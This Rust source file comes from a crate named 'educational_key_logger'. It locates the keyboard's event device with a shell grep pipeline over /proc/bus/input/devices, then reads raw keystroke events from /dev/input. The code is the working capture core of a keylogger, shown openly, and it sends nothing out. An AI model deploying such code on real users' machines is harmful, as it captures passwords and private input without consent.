use educational_key_logger::input::InputEvent;
use std::fs::File;
use std::io::Read;
use std::mem;
use std::process::Command;

pub fn get_key_event(mut device_file: &File) -> InputEvent {
    let mut buf: [u8; 24] = unsafe { mem::zeroed() };
    let num_bytes = device_file.read(&mut buf).unwrap();
    if num_bytes != mem::size_of::<InputEvent>() {
        panic!("Error while reading from device file");
    }
    let event: InputEvent = unsafe { mem::transmute(buf) };
    event
}

pub fn get_device_file() -> File {
    File::open(get_default_device()).unwrap()
}

fn get_default_device() -> String {
    let mut filenames = get_keyboard_device_filenames();
    filenames.swap_remove(0)
}

fn get_keyboard_device_filenames() -> Vec<String> {
    let mut command_str = "grep -E 'Handlers|EV' /proc/bus/input/devices".to_string();
    command_str.push_str("| grep -B1 120013");
    command_str.push_str("| grep -Eo event[0-9]+");

    let res = Command::new("sh")
        .arg("-c")
        .arg(command_str)
        .output()
        .unwrap_or_else(|e| {
            panic!("{}", e);
        });
    let res_str = std::str::from_utf8(&res.stdout).unwrap();

    let mut filenames = Vec::new();
    for file in res_str.trim().split('\n') {
        let mut filename = "/dev/input/".to_string();
        filename.push_str(file);
        filenames.push(filename);
    }
    filenames
}
